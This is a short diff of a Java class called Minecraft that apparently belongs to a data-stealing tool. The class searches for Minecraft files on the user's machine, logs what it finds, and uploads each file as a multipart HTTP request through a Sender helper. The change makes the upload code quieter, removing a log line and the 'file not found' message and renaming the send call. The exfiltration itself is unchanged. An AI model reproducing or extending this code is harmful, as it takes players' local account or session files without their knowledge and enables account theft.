@@ -34,14 +34,11 @@ public class Minecraft {
             File file = new File(mc + minecraftFilePaths[i]);
             if (file.exists()) {
                 Sender.sendMessage("Found " + file.getName() + " file.");
-                Sender.sendMessage("Sending file: " + file.getName());
                 RequestBody requestBody = new MultipartBody.Builder()
                         .setType(MultipartBody.FORM)
                         .addFormDataPart("file", file.getName(), RequestBody.create(okhttp3.MediaType.parse("application/octet-stream"), file))
                         .build();
-                Sender.Sender(client, requestBody);
-            } else {
-                Sender.sendMessage("File not found: " + minecraftFilePaths[i]);
+                Sender.sendFile(client, requestBody);
             }
         }
     }
